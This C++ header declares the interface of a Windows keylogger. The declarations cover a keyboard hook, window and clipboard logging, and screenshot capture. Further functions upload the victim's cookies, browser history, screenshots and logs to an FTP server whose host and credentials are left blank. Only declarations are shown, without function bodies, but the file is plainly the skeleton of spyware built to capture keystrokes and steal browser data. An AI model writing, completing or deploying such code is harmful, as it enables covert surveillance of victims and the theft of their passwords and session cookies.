#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#pragma warning(disable : 4820 5039 4365 6385 5045 4668)

#include <windows.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <algorithm>
#include <map>
#include <wininet.h>

#pragma comment(lib, "Wininet")
#include <thread>

#include <chrono>
#include <filesystem>

#include <gdiplus.h>
#pragma comment (lib, "gdiplus")

#define FTP_HOST L""
#define FTP_USERNAME L""
#define FTP_PASSWORD L""

typedef struct winkey_s
{
    HHOOK           keyboardHook;
    char            hwndFocusedWindow[256];
    char            hwndPrevFocusedWindow[256];
    std::string     localAppData;
    std::string     pathFile;
    std::string     prevClipBoard;
    std::string     targetIP;
    bool            nl;
    bool            running;
} winkey;

extern winkey winkey_g;

void CALLBACK       WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);
LRESULT CALLBACK    KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
std::string         clipboardChanged();
void CALLBACK       TimerCallback(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime);
void                logWindowChange();
void                logInput(char* buffer);
void                logClipboard(std::string buffer);
int                 sendFile(const char* pathToFile, const char* targetFtpFile);
int                 sendDirectory(const char* directoryName);
std::string         getTime(const char* format);
void                uploadFile();
void                threadUpload();
std::string         getMyIp();
void                uploadCookies(std::string directoryName);
void                uploadHistory(std::string directoryName);
bool                exist_file(std::string filename);
std::string         searchFile(std::string base, std::string filename);
void                uploadScreenShot(std::string targetPath);
void                createFileCopy();

#endif